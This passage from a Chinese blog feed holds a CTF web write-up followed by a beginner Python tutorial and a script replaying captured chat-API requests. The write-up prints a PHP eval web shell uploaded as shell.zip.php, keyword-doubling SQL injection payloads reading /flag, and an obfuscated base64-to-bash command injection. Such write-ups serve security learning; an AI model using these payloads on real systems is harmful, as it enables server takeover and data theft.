class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">18159431502352910098131068589</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>蚁剑连接cat &#x2F;flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145106152.png" alt="image-20240205145106152"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><p>依然是构造.zip.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.32.220.189:32767</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://101.32.220.189:32767/?action=upload</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------143906178423789204102969238846</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>276</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://101.32.220.189:32767</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.zip.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-zip-compressed</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nacl&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">143906178423789204102969238846</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240205145735598.png" alt="image-20240205145735598"></p><h2 id="sql教学局"><a href="#sql教学局" class="headerlink" title="sql教学局"></a>sql教学局</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(flag)/**/ffromrom/**/secret.passwoorrd%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/group_concat(grade)ffromrom/**/ctf.scoorre/**/where/**/student/**/like/**/&#x27;begin&#x27;%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&#x27;union/**/seselectlect/**/lloadoad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure><p>这里又想去rce看&#x2F;flag了,,,,,,,</p><p>忘记了load_file()</p><h2 id="readbooks-未解出"><a href="#readbooks-未解出" class="headerlink" title="readbooks(未解出)"></a>readbooks(未解出)</h2><p>虽然未找到flag但是payload是一点没问题()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/list/a||ec&#x27;&#x27;ho$&#123;IFS&#125;&#x27;Y2F0IC9fZmxhZw&#x27;|bas&#x27;&#x27;e64$&#123;IFS&#125;-d|ba&#x27;&#x27;sh</span><br></pre></td></tr></table></figure><p>这里已经rce了,但是里面没找到(感觉真的没有)flag,,,,</p><h2 id="pickelshop-未解出"><a href="#pickelshop-未解出" class="headerlink" title="pickelshop(未解出)"></a>pickelshop(未解出)</h2><p>拿到注册返回的cookie可以登录</p><p>感觉要解码,,不太会</p><h2 id="king-未解出"><a href="#king-未解出" class="headerlink" title="king(未解出)"></a>king(未解出)</h2><p>抓包了web Socket的流量, 看了MongoDB语法, 还是不知道怎么注入,,,</p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> nosql注入 </tag>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础</title>
      <link href="/2024/01/29/python%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/01/29/python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><p>之间也学过一些python编程基础,但大都是零散碎片化的知识</p><p>故在此系统地记录一下python的基本语法以及常见的操作</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>首先是一些基础语法,如 赋值, 四则运算, 选择分支, 循环, 嵌套</p><p>由于与其他语言大部分都重复, 这里只写一个简单的示例程序来演示这些基本操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">2025</span>):</span><br><span class="line">    <span class="keyword">if</span> year % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> year % <span class="number">100</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年是闰年&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> year % <span class="number">400</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年是闰年&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;year&#125;</span> 年不是闰年&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果显而易见</p><p>特别的,python中有<code>/</code>和<code>//</code>两种除法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> / <span class="number">3</span>)<span class="comment">#-0.3333333333333333</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#0</span></span><br><span class="line"><span class="built_in">print</span>(-<span class="number">1</span> // <span class="number">3</span>)<span class="comment">#-1</span></span><br></pre></td></tr></table></figure><p>显然, <code>/</code>执行了浮点运算,而<code>//</code>则是__向下取整__</p><h2 id="列表-List"><a href="#列表-List" class="headerlink" title="列表(List)"></a>列表(List)</h2><p>举例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br></pre></td></tr></table></figure><p>有以下几种切片方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;kcl&#x27;</span>, <span class="string">&#x27;hcl&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:])    <span class="comment"># 打印索引为1元素后的所有元素(包含索引为1的元素) </span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">1</span>:<span class="number">5</span>])   <span class="comment"># 左闭右开</span></span><br><span class="line"><span class="built_in">print</span>(list1[:<span class="number">5</span>])    <span class="comment"># 打印索引为5元素前的所有元素(不包含索引为5的元素)</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">1</span>])    <span class="comment"># 最后一个元素的索引为-1,以此类推</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;, &#x27;hcl&#x27;]</span><br><span class="line">[2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">[1, 2, 3, &#x27;nacl&#x27;, &#x27;kcl&#x27;]</span><br><span class="line">hcl</span><br></pre></td></tr></table></figure><h3 id="列表操作"><a href="#列表操作" class="headerlink" title="列表操作"></a>列表操作</h3><h4 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list1.append(<span class="string">&#x27;cabbage&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#输出: [1, 2, 3, &#x27;cabbage&#x27;]</span></span><br></pre></td></tr></table></figure><h4 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;cabbage&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> list1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="comment">#输出: [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h4 id="列表操作符"><a href="#列表操作符" class="headerlink" title="列表操作符"></a>列表操作符</h4><p>常用的就是<code>+</code>拼接,<code>in</code>判断某元素是否在列表中, 这里搬运一下菜鸟教程上的一个表格</p><table><thead><tr><th align="left">Python 表达式</th><th align="left">结果</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">len([1, 2, 3])</td><td align="left">3</td><td align="left">长度</td></tr><tr><td align="left">[1, 2, 3] + [4, 5, 6]</td><td align="left">[1, 2, 3, 4, 5, 6]</td><td align="left">组合</td></tr><tr><td align="left">[‘Hi!’] * 4</td><td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td><td align="left">重复</td></tr><tr><td align="left">3 in [1, 2, 3]</td><td align="left">True</td><td align="left">元素是否存在于列表中</td></tr><tr><td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td><td align="left">1 2 3</td><td align="left">迭代</td></tr></tbody></table><h4 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h4><p>列表是可以嵌套存在的, 即列表中的元素也可以是列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, [<span class="string">&#x27;nacl&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>], <span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">[&#x27;nacl&#x27;, &#x27;cabbage&#x27;]</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>这里的第二个元素(索引为1)就被声明成了一个有两个元素的列表</p><p>__更多列表相关的函数与方法:__<a href="https://www.runoob.com/python3/python3-list.html">https://www.runoob.com/python3/python3-list.html</a></p><h2 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h2><p>与list相似, 元组是一些元素的集合, 但是元组不可修改</p><p>元组中只包含一个元素时，需要在元素后面添加逗号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup1 = (<span class="number">50</span>,)</span><br></pre></td></tr></table></figure><p>元组的访问方式与list相同, 即都是使用<code>[]</code>并加上索引来访问</p><h3 id="无关闭分隔符"><a href="#无关闭分隔符" class="headerlink" title="无关闭分隔符"></a>无关闭分隔符</h3><p>任意无符号的对象，以逗号隔开，默认为元组</p><p>…说实话没太理解,它给出了一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;abc&#x27;</span>, -<span class="number">4.24e93</span>, <span class="number">18</span>+<span class="number">6.6j</span>, <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line">x, y = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Value of x , y : &quot;</span>, x,y</span><br></pre></td></tr></table></figure><p>以上实例运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc -4.24e+93 (18+6.6j) xyz</span><br><span class="line">Value of x , y : 1 2</span><br></pre></td></tr></table></figure><h3 id="元组内置函数"><a href="#元组内置函数" class="headerlink" title="元组内置函数"></a>元组内置函数</h3><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-cmp.html">cmp(tuple1, tuple2)</a> 比较两个元组元素。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-len.html">len(tuple)</a> 计算元组元素个数。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-max.html">max(tuple)</a> 返回元组中元素最大值。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-min.html">min(tuple)</a> 返回元组中元素最小值。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python/att-tuple-tuple.html">tuple(seq)</a> 将列表转换为元组。</td></tr></tbody></table><h2 id="字典-Dictionary"><a href="#字典-Dictionary" class="headerlink" title="字典(Dictionary)"></a>字典(Dictionary)</h2><p>字典采用键值对的方式来存储任意类型的对象</p><p>举例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;alice&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;mike&#x27;</span>: <span class="string">&#x27;43210&#x27;</span>, <span class="string">&#x27;bob&#x27;</span>: <span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;default&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&#x27;alice&#x27;</span>])</span><br><span class="line"><span class="comment"># 输出: 12345</span></span><br></pre></td></tr></table></figure><p>仍然采用<code>[]</code>来访问,只不过索引为要访问元素的键名</p><h3 id="修改字典"><a href="#修改字典" class="headerlink" title="修改字典"></a>修改字典</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tinydict[<span class="string">&#x27;Age&#x27;</span>] = <span class="number">8</span> <span class="comment"># 更新</span></span><br><span class="line">tinydict[<span class="string">&#x27;School&#x27;</span>] = <span class="string">&quot;RUNOOB&quot;</span> <span class="comment"># 添加</span></span><br><span class="line"><span class="keyword">del</span> tinydict[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line">tinydict.clear()      <span class="comment"># 清空字典所有条目</span></span><br><span class="line"><span class="keyword">del</span> tinydict          <span class="comment"># 删除字典</span></span><br></pre></td></tr></table></figure><h3 id="字典特性"><a href="#字典特性" class="headerlink" title="字典特性"></a>字典特性</h3><p>字典值可以是任何的 python 对象，既可以是标准的对象，也可以是用户定义的，但键不行</p><p>1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</p><p>2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行</p><p>更多: </p><p><a href="https://www.runoob.com/python3/python3-dictionary.html">https://www.runoob.com/python3/python3-dictionary.html</a></p><h2 id="集合-set"><a href="#集合-set" class="headerlink" title="集合(set)"></a>集合(set)</h2><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">words = &#123;<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;cabbage&#x27;</span>&#125;</span><br><span class="line">words.add(<span class="string">&#x27;rabbit&#x27;</span>)<span class="comment">#添加</span></span><br><span class="line">words.update([<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment">#参数可以是列表，元组，字典等，语法格式如下</span></span><br><span class="line">words.remove(<span class="string">&#x27;cabbage&#x27;</span>)<span class="comment">#删除</span></span><br><span class="line">s.discard(<span class="string">&#x27;cat&#x27;</span>)<span class="comment">#此方法删除元素时如果元素不存在，不会发生错误</span></span><br><span class="line"><span class="built_in">print</span>(words)</span><br><span class="line">输出:&#123;<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-add.html">add()</a></td><td align="left">为集合添加元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-clear.html">clear()</a></td><td align="left">移除集合中的所有元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-copy.html">copy()</a></td><td align="left">拷贝一个集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference.html">difference()</a></td><td align="left">返回多个集合的差集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-difference_update.html">difference_update()</a></td><td align="left">移除集合中的元素，该元素在指定的集合也存在。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-discard.html">discard()</a></td><td align="left">删除集合中指定的元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection.html">intersection()</a></td><td align="left">返回集合的交集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-intersection_update.html">intersection_update()</a></td><td align="left">返回集合的交集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-isdisjoint.html">isdisjoint()</a></td><td align="left">判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issubset.html">issubset()</a></td><td align="left">判断指定集合是否为该方法参数集合的子集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issuperset.html">issuperset()</a></td><td align="left">判断该方法的参数集合是否为指定集合的子集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-pop.html">pop()</a></td><td align="left">随机移除元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-remove.html">remove()</a></td><td align="left">移除指定元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference.html">symmetric_difference()</a></td><td align="left">返回两个集合中不重复的元素集合。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference_update.html">symmetric_difference_update()</a></td><td align="left">移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-union.html">union()</a></td><td align="left">返回两个集合的并集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-update.html">update()</a></td><td align="left">给集合添加元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html">len()</a></td><td align="left">计算集合元素个数</td></tr></tbody></table><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>基本结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line"></span><br><span class="line">hello()</span><br></pre></td></tr></table></figure><h1 id="随便写的一个python程序"><a href="#随便写的一个python程序" class="headerlink" title="随便写的一个python程序"></a>随便写的一个python程序</h1><p>抓包某gpt并在终端问答</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.stdout.encoding)</span><br><span class="line"><span class="comment">###########第一次运行后把生成的topicId粘贴在此################################</span></span><br><span class="line">topicId = <span class="number">0</span>     <span class="comment">######################</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line">host = <span class="string">&quot;api.xiabb.chat&quot;</span></span><br><span class="line">UA = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################抓包并填写自己的Authorization##############</span></span><br><span class="line">Authorization = <span class="string">&quot;example&quot;</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendMessage</span>():</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&#x27;msg:&#x27;</span>)</span><br><span class="line">    data = &#123;<span class="string">&quot;topicId&quot;</span>:topicId,</span><br><span class="line">            <span class="string">&quot;messages&quot;</span>:[],</span><br><span class="line">            <span class="string">&quot;content&quot;</span>:msg,</span><br><span class="line">            <span class="string">&quot;contentFiles&quot;</span>:[]</span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.post(url=url, json=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        messageRes = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(messageRes)</span><br><span class="line">        messageId = messageRes[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(messageId)</span><br><span class="line">        <span class="comment"># options</span></span><br><span class="line">        url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message/&quot;</span> + <span class="built_in">str</span>(messageId)</span><br><span class="line">        opts_headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Headers&quot;</span>: <span 